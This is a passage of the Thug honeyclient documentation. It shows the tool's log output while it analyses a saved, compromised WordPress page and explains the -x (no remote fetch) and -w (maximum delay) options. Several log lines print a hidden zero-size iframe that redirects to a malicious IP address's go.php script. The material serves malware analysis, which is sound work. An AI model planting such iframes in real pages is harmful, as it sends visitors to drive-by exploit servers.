<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:32<span class="o">]</span><span class="w"> </span>&lt;iframe<span class="w"> </span><span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:32<span class="o">]</span><span class="w"> </span><span class="o">[</span>iframe<span class="w"> </span>redirection<span class="o">]</span><span class="w"> </span>about:blank<span class="w"> </span>-&gt;<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:42<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">408</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:42<span class="o">]</span><span class="w"> </span><span class="o">[</span>Request<span class="w"> </span>Timeout<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:42<span class="o">]</span><span class="w"> </span>&lt;iframe<span class="w"> </span><span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:42<span class="o">]</span><span class="w"> </span><span class="o">[</span>iframe<span class="w"> </span>redirection<span class="o">]</span><span class="w"> </span>about:blank<span class="w"> </span>-&gt;<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">408</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>Request<span class="w"> </span>Timeout<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
</pre></div>
</div>
<p>This is what we expect. Let’s prevent remote content fetching now while analyzing the same
locally saved page.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-x<span class="w"> </span>../samples/exploits/55875.html
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span><span class="w"> </span>http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span><span class="o">[</span>Meta<span class="o">]</span><span class="w"> </span>Generator:<span class="w"> </span>WordPress<span class="w"> </span><span class="m">2</span>.2.1
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span><span class="w"> </span><span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span><span class="w"> </span><span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:00<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:01<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span><span class="w"> </span><span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:33:01<span class="o">]</span><span class="w"> </span>&lt;iframe<span class="w"> </span><span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
</pre></div>
</div>
</section>
<section id="other-useful-features">
<h2>Other useful features<a class="headerlink" href="#other-useful-features" title="Link to this heading"></a></h2>
<p>An interesting feature (introduced in Thug 0.4.13) allows you to define a maximum delay for
methods like setTimeout and setInterval which set a delay for executing a function. For instance
if the original code contains a statement like</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">do_stuff</span><span class="p">,</span><span class="w"> </span><span class="mf">60000</span><span class="p">);</span>
</pre></div>
</div>
<p>the code will sleep for 60 seconds before executing the function <cite>do_stuff</cite>. There are situations
where you would like to avoid wasting this time. In such cases, Thug provides the -w (–delay)
option. Simply running Thug this way (please note the interval is expressed in milliseconds)</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-w<span class="w"> </span><span class="m">2000</span><span class="w"> </span><span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
</pre></div>
</div>
<p>will force a maximum delay of 2 seconds.</p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="configuration.html" class="btn btn-neutral float-left" title="Configuration" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="api.html" class="btn btn-neutral float-right" title="Thug API" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2011-2024, Angelo Dell&#39;Aera.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>